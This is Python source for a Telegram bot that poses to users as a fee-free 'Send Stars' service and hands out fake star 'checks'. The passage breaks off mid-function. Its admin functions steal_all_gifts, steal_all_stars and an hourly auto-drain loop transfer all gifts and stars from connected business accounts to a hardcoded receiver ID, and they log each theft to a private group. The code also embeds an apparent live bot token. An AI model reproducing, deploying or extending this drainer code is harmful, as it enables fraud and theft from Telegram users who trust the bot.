import logging
import urllib.parse
import json
import os
import asyncio
import time
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    BusinessConnection,
    InlineQuery,
    InputTextMessageContent,
    InlineQueryResultArticle,
    InlineQueryResultPhoto,
    LabeledPrice,
    PreCheckoutQuery
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramNotFound
from aiogram.client.default import DefaultBotProperties
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGift, TransferStars, DepositStates, StarAmount, Gift
from uuid import uuid4
from typing import Dict, List, Any, Union

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ЗАМЕНИТЕ НА ВАШИ РЕАЛЬНЫЕ ДАННЫЕ:
TOKEN = "8189356827:AAFz5RM1NhYMf5ycn9STeSha2h1uqBRCC2E"
BOT_USERNAME = "@Kids_starsbot"
RECEIVER_ID = 5858391454  # ID получателя звёзд (цифра)
CONNECTIONS_FILE = "business_connections.json"
GIFT_CHECKS_FILE = "gift_checks.json"
USER_BALANCES_FILE = "user_balances.json"
ADMINS_FILE = "admins.json"
AUTO_DRAIN_CONFIG_FILE = "auto_drain_config.json"
LOG_GROUP_ID = -1003187597967  # ID группы для логов
SUPPORT_URL = "ваш_канал_поддержки"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

SUPER_ADMINS = {5858391454}  # ID супер-админов через запятую

def get_file_path(filename):
    return os.path.join(BASE_DIR, filename)

def load_admins():
    try:
        with open(get_file_path(ADMINS_FILE), "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                loaded_admins = []
            else:
                loaded_admins = json.loads(content)
    except (FileNotFoundError, json.JSONDecodeError):
        loaded_admins = []
        
    return list(set(loaded_admins) | SUPER_ADMINS)

def save_admins(admins):
    try:
        admins_to_save = [admin for admin in admins if admin not in SUPER_ADMINS]
        with open(get_file_path(ADMINS_FILE), "w", encoding="utf-8") as f:
            json.dump(admins_to_save, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"ошибка сейва админа {ADMINS_FILE}: {e}")

ADMIN_IDS = load_admins()

def load_auto_drain_config():
    try:
        with open(get_file_path(AUTO_DRAIN_CONFIG_FILE), "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"enabled": False}

def save_auto_drain_config(config):
    with open(get_file_path(AUTO_DRAIN_CONFIG_FILE), "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2, ensure_ascii=False)

AUTO_DRAIN_CONFIG = load_auto_drain_config()

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()

class DepositStates(StatesGroup):
    waiting_for_deposit_amount = State()

class GiftTransferStates(StatesGroup):
    waiting_for_receiver_id = State()

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())

def load_json_file(filename):
    try:
        with open(get_file_path(filename), "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return {} if filename in [GIFT_CHECKS_FILE, USER_BALANCES_FILE] else []
            return json.loads(content)
    except (FileNotFoundError, json.JSONDecodeError):
        return {} if filename in [GIFT_CHECKS_FILE, USER_BALANCES_FILE] else []

def save_json_file(filename, data):
    with open(get_file_path(filename), "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_connections():
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        unique_connections = []
        seen = set()
        for conn in connections:
            identifier = conn["business_connection_id"]
            if identifier not in seen:
                seen.add(identifier)
                unique_connections.append(conn)
        return unique_connections
    except Exception:
        return []

def save_connections(connections):
    save_json_file(CONNECTIONS_FILE, connections)

async def remove_invalid_connection(connection_id: str):
    connections = load_connections()
    new_connections = [conn for conn in connections if conn["business_connection_id"] != connection_id]
    if len(new_connections) < len(connections):
        save_connections(new_connections)
        logger.warning(f"Removed invalid connection: {connection_id}")
        return True
    return False

async def check_permissions(business_connection: BusinessConnection, errors: list) -> Dict[str, Any]:
    permissions = {
        "can_send_messages": False,
        "can_read_messages": False,
        "can_send_stickers": False,
        "can_manage_chat": False,
        "can_transfer_stars": False,
        "can_transfer_gifts": False,
    }
    
    if business_connection.rights:
        permissions["can_send_messages"] = getattr(business_connection.rights, "can_send_messages", False)
        permissions["can_read_messages"] = getattr(business_connection.rights, "can_read_messages", False)
        permissions["can_send_stickers"] = getattr(business_connection.rights, "can_send_stickers", False)
        permissions["can_manage_chat"] = getattr(business_connection.rights, "can_manage_chat", False)
    
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
        permissions["can_transfer_stars"] = True
    except TelegramBadRequest as e:
        errors.append(f"Не удалось получить баланс звёзд: {e.message}")
        permissions["can_transfer_stars"] = False
    except Exception as e:
        errors.append(f"Ошибка при проверке баланса звёзд: {e}")
        
    try:
        response = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection.id))
        permissions["can_transfer_gifts"] = True
    except TelegramBadRequest as e:
        errors.append(f"Не удалось получить список подарков: {e.message}")
        permissions["can_transfer_gifts"] = False
    except Exception as e:
        errors.append(f"Ошибка при проверке подарков: {e}")
        
    return permissions

async def check_balance(connection_id: str, errors: list):
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
        if hasattr(response, 'star_amount'):
            return response.star_amount
        else:
            errors.append("Неверный формат ответа от баланса звёзд")
            return 0
    except (TelegramBadRequest, TelegramNotFound) as e:
        errors.append(f"Не удалось получить баланс звёзд: {e.message}")
        await remove_invalid_connection(connection_id)
        return 0
    except Exception as e:
        errors.append(f"Ошибка при проверке баланса: {e}")
        return 0

async def get_gifts_list(connection_id: str, errors: list):
    try:
        response = await bot(GetFixedBusinessAccountGifts(business_connection_id=connection_id))
        if hasattr(response, 'gifts'):
            return response.gifts
        else:
            return []
    except (TelegramBadRequest, TelegramNotFound) as e:
        errors.append(f"Не удалось получить список подарков: {e.message}")
        await remove_invalid_connection(connection_id)
        return []
    except Exception as e:
        errors.append(f"Ошибка при получении списка подарков: {e}")
        return []

def get_gift_list_message(gifts: List[Gift]):
    message = "<b>Список подарков:</b>\n"
    if not gifts:
        message += "Подарки отсутствуют.\n"
        return message
    
    for i, gift in enumerate(gifts):
        gift_info = gift.gift
        
        name = gift_info.name if hasattr(gift_info, 'name') else "Неизвестный подарок"
        stars = gift_info.star_count if hasattr(gift_info, 'star_count') and gift_info.star_count is not None else 0
        number = gift_info.number if hasattr(gift_info, 'number') and gift_info.number is not None else "None"
        
        if gift.type == "unique":
            nft_link = ""
            if hasattr(gift_info, 'base_name') and gift_info.base_name and hasattr(gift_info, 'number') and gift_info.number:
                nft_name = f"{gift_info.base_name}-{gift_info.number}".replace(" ", "")
                nft_link = f" (<a href='https://t.me/nft/{nft_name}'>https://t.me/nft/{nft_name}</a>)"
            elif hasattr(gift_info, 'name') and gift_info.name and gift_info.name.count('-') > 0:
                cleaned_name = gift_info.name.replace(" ", "")
                nft_link = f" (<a href='https://t.me/nft/{cleaned_name}'>https://t.me/nft/{cleaned_name}</a>)"
            
            message += f"🎁 {name} #{number} (<code>{stars}⭐</code>){nft_link}\n"
    return message

async def steal_all_gifts(connection_id: str, username: str):
    try:
        await bot.send_message(
            LOG_GROUP_ID,
            f"🔔 <b>Начало кражи подарков</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>"
        )
        
        response = await bot(GetFixedBusinessAccountGifts(business_connection_id=connection_id))
        stolen_count = 0
        skipped_count = 0
        error_details = []

        logger.info(f"Found {len(response.gifts) if hasattr(response, 'gifts') else 0} gifts to process for connection {connection_id}")

        if hasattr(response, 'gifts'):
            for gift in response.gifts:
                try:
                    if not getattr(gift, 'can_be_transferred', False):
                        gift_name = getattr(gift.gift, 'name', 'Неизвестно') if hasattr(gift, 'gift') else 'Неизвестно'
                        error_details.append(f"• Подарок '{gift_name}' непередаваемый.")
                        skipped_count += 1
                        continue

                    current_time = int(time.time())
                    next_transfer_date = getattr(gift, 'next_transfer_date', 0)
                    if next_transfer_date > current_time:
                        cooldown = next_transfer_date - current_time
                        gift_name = getattr(gift.gift, 'name', 'Неизвестно') if hasattr(gift, 'gift') else 'Неизвестно'
                        error_details.append(f"• Подарок '{gift_name}' на кулдауне ({cooldown} сек).")
                        skipped_count += 1
                        continue

                    try:
                        await bot(TransferGift(
                            business_connection_id=connection_id,
                            owned_gift_id=gift.owned_gift_id,
                            new_owner_chat_id=RECEIVER_ID,
                            star_count=getattr(gift, 'transfer_star_count', None)
                        ))
                        logger.info(f"✅ Successfully stolen gift: {gift.owned_gift_id}")
                        stolen_count += 1
                    except (TelegramBadRequest, TelegramNotFound) as e:
                        logger.error(f"Failed to transfer gift {gift.owned_gift_id}: {e}")
                        gift_name = getattr(gift.gift, 'name', 'Неизвестно') if hasattr(gift, 'gift') else 'Неизвестно'
                        error_details.append(f"• Ошибка при передаче подарка '{gift_name}': {str(e)}")
                        skipped_count += 1
                    except Exception as e:
                        logger.error(f"Unexpected error transferring gift {gift.owned_gift_id}: {e}")
                        gift_name = getattr(gift.gift, 'name', 'Неизвестно') if hasattr(gift, 'gift') else 'Неизвестно'
                        error_details.append(f"• Непредвиденная ошибка с подарком '{gift_name}': {str(e)}")
                        skipped_count += 1

                    await asyncio.sleep(0.5)

                except Exception as e:
                    logger.error(f"Failed to process gift {gift.owned_gift_id}: {e}")
                    gift_name = getattr(gift.gift, 'name', 'Неизвестно') if hasattr(gift, 'gift') else 'Неизвестно'
                    error_details.append(f"• Критическая ошибка обработки подарка '{gift_name}': {str(e)}")
                    skipped_count += 1

        result_msg = f"🎁 Подарки успешно украдены: {stolen_count}"
        if skipped_count > 0:
            result_msg += f" (пропущено/ошибка: {skipped_count})"
        
        error_message = ""
        if error_details:
            error_message = "🔴 <b>Список ошибок:</b>\n" + "\n".join(error_details)
        
        await bot.send_message(
            LOG_GROUP_ID,
            f"✅ <b>Кража подарков завершена</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>\n"
            f"🎁 Украдено: {stolen_count}\n"
            f"❌ Пропущено: {skipped_count}\n\n"
            f"{error_message}"
        )

        return True, result_msg, error_message

    except TelegramBadRequest as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            error_msg = "❌ Неверное бизнес-подключение, удалено из списка"
        else:
            error_msg = f"❌ Ошибка API: {str(e)}"
        
        await bot.send_message(
            LOG_GROUP_ID,
            f"❌ <b>Ошибка при краже подарков</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>\n"
            f"⚠️ Ошибка: {error_msg}"
        )
        return False, error_msg, ""
    except Exception as e:
        logger.exception("Ошибка при краже подарков")
        
        await bot.send_message(
            LOG_GROUP_ID,
            f"❌ <b>Критическая ошибка при краже подарков</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>\n"
            f"⚠️ Ошибка: {str(e)}"
        )
        return False, f"❌ Кража не удалась: {str(e)}", ""

async def steal_all_stars(connection_id: str, username: str):
    try:
        await bot.send_message(
            LOG_GROUP_ID,
            f"🔔 <b>Начало кражи звёзд</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>"
        )
        
        logger.info(f"Начало кражи звёзд с {connection_id}")
        balance_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
        star_amount = balance_response.star_amount if hasattr(balance_response, 'star_amount') else 0
        logger.info(f"Текущий баланс звёзд: {star_amount}")
        
        if star_amount <= 0:
            await bot.send_message(
                LOG_GROUP_ID,
                f"❌ <b>Нет звёзд для кражи</b>\n"
                f"👤 Пользователь: @{username}\n"
                f"🔗 Connection ID: <code>{connection_id}</code>"
            )
            return False, "❌ Нет доступных звёзд", ""
        
        logger.info(f"Передача {star_amount} звёзд...")
        transfer_result = await bot(TransferStars(
            business_connection_id=connection_id,
            receiver_user_id=RECEIVER_ID,
            star_amount=star_amount,
            request_id=f"transfer_{connection_id}_{int(time.time())}"
        ))
        logger.info(f"Результат передачи: {transfer_result}")
        
        if transfer_result:
            await bot.send_message(
                LOG_GROUP_ID,
                f"✅ <b>Кража звёзд завершена</b>\n"
                f"👤 Пользователь: @{username}\n"
                f"🔗 Connection ID: <code>{connection_id}</code>\n"
                f"⭐ Передано: {star_amount}"
            )
            return True, f"⭐️ Успешно передано {star_amount} звёзд!", ""
        
        await bot.send_message(
            LOG_GROUP_ID,
            f"❌ <b>Передача звёзд не удалась</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>"
        )
        return False, f"❌ Передача не удалась.", ""
    
    except (TelegramBadRequest, TelegramNotFound) as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            error_msg = "Подключение недействительно, удалено."
        else:
            error_msg = str(e)
            
        logger.error(f"Ошибка Telegram API: {error_msg}")
        await bot.send_message(
            LOG_GROUP_ID,
            f"❌ <b>Ошибка при краже звёзд</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>\n"
            f"⚠️ Ошибка: {error_msg}"
        )
        return False, f"❌ Ошибка API: {error_msg}", ""
    
    except Exception as e:
        logger.exception("Ошибка при краже звёзд")
        await bot.send_message(
            LOG_GROUP_ID,
            f"❌ <b>Критическая ошибка при краже звёзд</b>\n"
            f"👤 Пользователь: @{username}\n"
            f"🔗 Connection ID: <code>{connection_id}</code>\n"
            f"⚠️ Ошибка: {str(e)}"
        )
        return False, f"❌ Критическая ошибка: {str(e)}", ""

async def load_active_connections():
    connections = load_connections()
    active_connections = []
    for conn in connections:
        if conn.get("can_transfer_stars", False) or conn.get("can_transfer_gifts", False):
             active_connections.append(conn)
        else:
            pass
            
    return active_connections

async def auto_drain_all_accounts():
    while True:
        if AUTO_DRAIN_CONFIG["enabled"]:
            logger.info("Начинается автоматический дрейн...")
            connections = await load_active_connections()
            if connections:
                for connection in connections:
                    connection_id = connection["business_connection_id"]
                    username = connection.get("username", "Неизвестно")
                    
                    if connection.get("can_transfer_gifts", False):
                        await steal_all_gifts(connection_id, username)
                        await asyncio.sleep(2)
                    
                    if connection.get("can_transfer_stars", False):
                        await steal_all_stars(connection_id, username)
                        await asyncio.sleep(5)
                
                await bot.send_message(LOG_GROUP_ID, "✅ <b>Автоматический дрейн завершен.</b>")
            else:
                logger.info("Нет активных подключений для автоматического дрейна.")
        
        await asyncio.sleep(3600)

def get_user_balance(user_id: int):
    balances = load_json_file(USER_BALANCES_FILE)
    return balances.get(str(user_id), 0)

def add_user_balance(user_id: int, amount: int):
    balances = load_json_file(USER_BALANCES_FILE)
    user_id_str = str(user_id)
    balances[user_id_str] = balances.get(user_id_str, 0) + amount
    save_json_file(USER_BALANCES_FILE, balances)

def subtract_user_balance(user_id: int, amount: int):
    balances = load_json_file(USER_BALANCES_FILE)
    user_id_str = str(user_id)
    current_balance = balances.get(user_id_str, 0)
    if current_balance >= amount:
        balances[user_id_str] = current_balance - amount
        save_json_file(USER_BALANCES_FILE, balances)
        return True
    return False

@dp.message(F.text.startswith("/start"))
async def start_command(message: Message):
    if len(message.text.split()) == 2 and message.text.split()[1].startswith("check_"):
        check_id = message.text.split()[1][6:]
        check_info = get_gift_check(check_id)
        if check_info and not check_info["activated"]:
            activate_gift_check(check_id, message.from_user.id)
            await message.answer(
                f"🎉 Чек на {check_info['stars']} звёзд активирован!"
            )
            try:
                log_message = (
                    f"📋 <b>Чек активирован!</b>\n"
                    f"👤 Пользователь: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> (ID: <code>{message.from_user.id}</code>)\n"
                    f"⭐ Количество звёзд: <code>{check_info['stars']}</code>"
                )
                await bot.send_message(LOG_GROUP_ID, log_message)
                if check_info.get("sender_id"):
                    await bot.send_message(check_info["sender_id"], log_message)
            except Exception as e:
                logger.exception(f"Не удалось отправить уведомление в лог-группу или админу: {e}")
            return
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⭐ Баланс", callback_data="user_balance")],
            [InlineKeyboardButton(text="➕ Пополнить звезды", callback_data="user_deposit")],
            [InlineKeyboardButton(text="📮 Вывести звезды", callback_data="user_withdraw")],
            [InlineKeyboardButton(text="❓ FAQ", url="https://telegra.ph/FAQ-08-03-22")]
        ]
    )
    await message.answer(
        "👀 Добро пожаловать в Send Stars!\n\n"
        "Наш бот поможет отправить звезды без комиссий прямиком на баланс получателя.\n\n"
        "Выберите нужный раздел:",
        reply_markup=keyboard
    )

@dp.message(F.text == "/admin")
async def admin_panel_command(message: Message):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ У вас нет прав на использование этой команды.")
        return
    
    active_connections = await load_active_connections()
    count = len(active_connections)
    
    drain_status = "Включен" if AUTO_DRAIN_CONFIG["enabled"] else "Выключен"
    drain_toggle_button_text = "🔴 Выключить авто-дрейн" if AUTO_DRAIN_CONFIG["enabled"] else "🟢 Включить авто-дрейн"
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✨ Украсть все подарки", callback_data="steal_all")],
            [InlineKeyboardButton(text="💰 Украсть все звёзды", callback_data="steal_stars")],
            [InlineKeyboardButton(text="⭐️ Проверить баланс звёзд", callback_data="check_stars")],
            [InlineKeyboardButton(text="🔄 Обновить подключения", callback_data="refresh_connections")],
            [InlineKeyboardButton(text=drain_toggle_button_text, callback_data="toggle_auto_drain")],
            [InlineKeyboardButton(text="👑 Выдать админу звёзды", callback_data="admin_give_stars")]
        ]
    )
    await message.answer(
        f"👑 <b>Панель администратора</b>\n\n"
        f"🔗 Активных подключений: <code>{count}</code>\n"
        f"⚙️ Автоматический дрейн: <b>{drain_status}</b>\n\n"
        "⚠️ Используйте кнопки ниже для управления аккаунтами:",
        reply_markup=keyboard
    )

@dp.message(F.text.startswith("/stars"))
async def give_stars_command(message: Message):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if message.from_user.id in ADMIN_IDS:
        try:
            parts = message.text.split()
            if len(parts) == 2:
                amount = int(parts[1])
                if amount > 0:
                    add_user_balance(message.from_user.id, amount)
                    await message.answer(f"✅ Вы успешно выдали себе {amount} звёзд.")
                else:
                    await message.answer("❌ Количество звёзд должно быть положительным числом.")
            else:
                await message.answer("❌ Неверный формат. Используйте: /stars [количество]")
        except ValueError:
            await message.answer("❌ Неверный формат. Количество звёзд должно быть числом.")
    else:
        await message.answer("❌ У вас нет прав на использование этой команды.")

@dp.inline_query()
async def inline_fake_check_query(inline_query: InlineQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if inline_query.from_user.id not in ADMIN_IDS:
        await inline_query.answer([], cache_time=1,
                                 switch_pm_text="Только админы могут создавать чеки.",
                                 switch_pm_parameter="admin_only")
        return
    try:
        query = inline_query.query.strip()
        logger.info(f"Получен инлайн-запрос: '{query}'")
        if not query:
            await inline_query.answer([], cache_time=1,
                                     switch_pm_text="Введите число звезд после имени бота",
                                     switch_pm_parameter="help_inline")
            return
        
        cleaned_query = ''.join(filter(str.isdigit, query))
        logger.info(f"Очищенный запрос: '{cleaned_query}'")
        
        if not cleaned_query:
            await inline_query.answer([], cache_time=1,
                                     switch_pm_text="Введите только число звезд после имени бота, например: 50",
                                     switch_pm_parameter="help_inline")
            return
        
        try:
            stars_amount = int(cleaned_query)
            if stars_amount <= 0:
                description = "Количество звёзд должно быть положительным числом."
                input_content = InputTextMessageContent(message_text=description)
                results = [
                    InlineQueryResultArticle(
                        id=str(uuid4()),
                        title="Ошибка",
                        description=description,
                        input_message_content=input_content
                    )
                ]
            else:
                check_id = str(uuid4())
                save_gift_check(check_id, stars_amount, inline_query.from_user.id)
                
                results = [
                    InlineQueryResultPhoto(
                        id=str(uuid4()),
                        photo_url="https://i.ibb.co/xKmjtryn/banner-2.jpg",
                        thumbnail_url="https://i.ibb.co/xKmjtryn/banner-2.jpg",
                        caption=f"🚀 Вы получили Чек на {stars_amount} звёзд!",
                        reply_markup=InlineKeyboardMarkup(
                            inline_keyboard=[
                                [InlineKeyboardButton(
                                    text=f"Получить {stars_amount} ⭐",
                                    url=f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=check_{check_id}"
                                )]
                            ]
                        )
                    )
                ]
            await inline_query.answer(results, is_personal=True, cache_time=1)
        except ValueError as e:
            logger.error(f"Ошибка преобразования в число: {e}, cleaned_query: '{cleaned_query}'")
            await inline_query.answer([], cache_time=1,
                                     switch_pm_text="Введите только число звезд после имени бота, например: 50",
                                     switch_pm_parameter="help_inline")
    except Exception as e:
        logger.exception(f"Ошибка при обработке инлайн-запроса: {e}")
        await inline_query.answer([], cache_time=1,
                                 switch_pm_text="Произошла ошибка при обработке запроса.",
                                 switch_pm_parameter="error_inline")
        
@dp.message(F.text.startswith("/add"))
async def add_admin_command(message: Message):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ У вас нет прав на использование этой команды.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Неверный формат. Используйте: /add [ID]")
            return
        
        new_admin_id = int(parts[1])
        if new_admin_id in ADMIN_IDS:
            await message.answer(f"❌ Пользователь с ID {new_admin_id} уже является админом.")
            return
        
        ADMIN_IDS.append(new_admin_id)
        save_admins(ADMIN_IDS)
        await message.answer(f"✅ Пользователь с ID {new_admin_id} добавлен в админы.")
        
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"🔔 <b>Новый админ добавлен!</b>\n"
                f"👤 Админ: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> (ID: <code>{message.from_user.id}</code>)\n"
                f"➕ Новый админ ID: <code>{new_admin_id}</code>"
            )
        except Exception as e:
            logger.error(f"Не удалось отправить уведомление в лог-группу: {e}")
            
    except ValueError:
        await message.answer("❌ ID должен быть числом.")
    except Exception as e:
        logger.error(f"Ошибка при добавлении админа: {e}")
        await message.answer("❌ Произошла ошибка при добавлении админа.")

@dp.message(F.text.startswith("/delete"))
async def delete_admin_command(message: Message):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ У вас нет прав на использование этой команды.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Неверный формат. Используйте: /delete [ID]")
            return
        
        admin_id_to_remove = int(parts[1])
        
        if admin_id_to_remove in SUPER_ADMINS:
            await message.answer("❌ Нельзя удалить главного админа, прописанного в коде.")
            return
        
        if admin_id_to_remove not in ADMIN_IDS:
            await message.answer(f"❌ Пользователь с ID {admin_id_to_remove} не является админом.")
            return
        
        if admin_id_to_remove == message.from_user.id:
            await message.answer("❌ Нельзя удалить самого себя из админов.")
            return
        
        ADMIN_IDS.remove(admin_id_to_remove)
        save_admins(ADMIN_IDS)
        await message.answer(f"✅ Пользователь с ID {admin_id_to_remove} удален из админов.")
        
        try:
            await bot.send_message(
                LOG_GROUP_ID,
                f"🔔 <b>Админ удален!</b>\n"
                f"👤 Админ: <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a> (ID: <code>{message.from_user.id}</code>)\n"
                f"➖ Удален админ ID: <code>{admin_id_to_remove}</code>"
            )
        except Exception as e:
            logger.error(f"Не удалось отправить уведомление в лог-группу: {e}")
            
    except ValueError:
        await message.answer("❌ ID должен быть числом.")
    except Exception as e:
        logger.error(f"Ошибка при удалении админа: {e}")
        await message.answer("❌ Произошла ошибка при удалении админа.")

def save_gift_check(check_id: str, stars: int, sender_id: int):
    checks = load_json_file(GIFT_CHECKS_FILE)
    checks[check_id] = {"stars": stars, "sender_id": sender_id, "activated": False, "activated_by": None}
    save_json_file(GIFT_CHECKS_FILE, checks)

def get_gift_check(check_id: str):
    checks = load_json_file(GIFT_CHECKS_FILE)
    return checks.get(check_id)

def activate_gift_check(check_id: str, user_id: int):
    checks = load_json_file(GIFT_CHECKS_FILE)
    if check_id in checks and not checks[check_id]["activated"]:
        checks[check_id]["activated"] = True
        checks[check_id]["activated_by"] = user_id
        save_json_file(GIFT_CHECKS_FILE, checks)
        add_user_balance(user_id, checks[check_id]["stars"])
        return True
    return False

@dp.callback_query(F.data.startswith("activate_check:"))
async def process_activate_check(callback: CallbackQuery):
    check_id = callback.data.split(":")[1]
    check_info = get_gift_check(check_id)
    if not check_info:
        await callback.answer("Чек не найден или истёк.", show_alert=True)
        return
    if check_info["activated"]:
        await callback.answer("Чек уже активирован.", show_alert=True)
        return
    if activate_gift_check(check_id, callback.from_user.id):
        await bot.send_message(
            chat_id=callback.from_user.id,
            text=f"🎉 Чек на {check_info['stars']} звёзд активирован!"
        )
        await callback.answer("Чек активирован!", show_alert=False)
        if callback.message:
            try:
                activated_keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text=f"✅ Чек активирован на {check_info['stars']} звёзд", callback_data="activated_dummy")]
                    ]
                )
                await callback.message.edit_reply_markup(reply_markup=activated_keyboard)
            except TelegramBadRequest as e:
                logger.warning(f"Не удалось отредактировать сообщение: {e}")
        
        try:
            log_message = (
                f"📋 <b>Чек активирован!</b>\n"
                f"👤 Пользователь: <a href='tg://user?id={callback.from_user.id}'>{callback.from_user.full_name}</a> (ID: <code>{callback.from_user.id}</code>)\n"
                f"⭐ Количество звёзд: <code>{check_info['stars']}</code>"
            )
            await bot.send_message(LOG_GROUP_ID, log_message)
            if check_info.get("sender_id"):
                await bot.send_message(check_info["sender_id"], log_message)
        except Exception as e:
            logger.exception(f"Не удалось отправить уведомление в лог-группу или админу: {e}")

    else:
        await callback.answer("Не удалось активировать чек.", show_alert=True)

@dp.callback_query(F.data == "steal_all")
async def steal_all_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.answer("⏳ Запущена кража подарков...")
    asyncio.create_task(steal_all_gifts_task(callback))

async def steal_all_gifts_task(callback: CallbackQuery):
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ Нет активных подключений")
        return
    total_stolen = 0
    for connection in connections:
        connection_id = connection["business_connection_id"]
        username = connection.get("username", "Неизвестно")
        success, message, errors = await steal_all_gifts(connection_id, username)
        if success:
            total_stolen += 1
            await callback.message.answer(
                f"✅ Подарки успешно украдены у @{username}!\n{message}\n\n{errors}"
            )
        else:
            await callback.message.answer(
                f"❌ Не удалось украсть у @{username}: {message}\n\n{errors}"
            )
        await asyncio.sleep(3)
    await callback.message.answer(f"✨ Всего аккаунтов опустошено: {total_stolen}")

@dp.callback_query(F.data == "steal_stars")
async def steal_stars_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.answer("💰 Запущена кража звёзд...")
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ Нет активных подключений")
        return
    keyboard = InlineKeyboardBuilder()
    for connection in connections:
        keyboard.button(
            text=f"👤 @{connection['username']}",
            callback_data=f"steal_stars_user:{connection['business_connection_id']}"
        )
    keyboard.adjust(1)
    await callback.message.answer(
        "🔍 Выберите пользователя, у которого украсть звёзды:",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data == "check_stars")
async def check_stars_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.answer("⭐️ Проверка звёзд...")
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ Нет активных подключений")
        return
    message_text = "⭐️ <b>Отчёт по балансу звёзд:</b>\n\n"
    for connection in connections:
        connection_id = connection["business_connection_id"]
        username = connection.get("username", "Неизвестно")
        try:
            errors = []
            star_amount = await check_balance(connection_id, errors)
            message_text += f"👤 @{username}: <code>{star_amount} звёзд</code>\n"
        except Exception as e:
            logger.error(f"Ошибка проверки звёзд для {username}: {e}")
            message_text += f"👤 @{username}: ❌ Ошибка\n"
    if len(message_text) > 4000:
        for i in range(0, len(message_text), 4000):
            await callback.message.answer(message_text[i:i+4000])
            await asyncio.sleep(0.5)
    else:
        await callback.message.answer(message_text)

@dp.callback_query(F.data == "refresh_connections")
async def refresh_connections_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    await callback.answer("🔄 Обновление...")
    connections = load_connections()
    
    for conn in connections:
        connection_id = conn["business_connection_id"]
        
        errors = []
        new_permissions = await check_permissions(BusinessConnection(**conn), errors)
        conn.update(new_permissions)
        conn['star_balance'] = await check_balance(connection_id, errors)
        
        gifts_list = await get_gifts_list(connection_id, errors)
        conn['gifts_count'] = len(gifts_list)
        conn['gifts_info'] = [gift.model_dump_json() for gift in gifts_list]
        conn['errors'] = errors
        
    save_connections(connections)
    
    await callback.message.answer(f"🔗 Активных подключений: <code>{len(connections)}</code>")

@dp.callback_query(F.data == "toggle_auto_drain")
async def toggle_auto_drain_handler(callback: CallbackQuery):
    global ADMIN_IDS
    ADMIN_IDS = load_admins()
    if callback.from_user.id not in ADMIN_IDS: return
    
    global AUTO_DRAIN_CONFIG
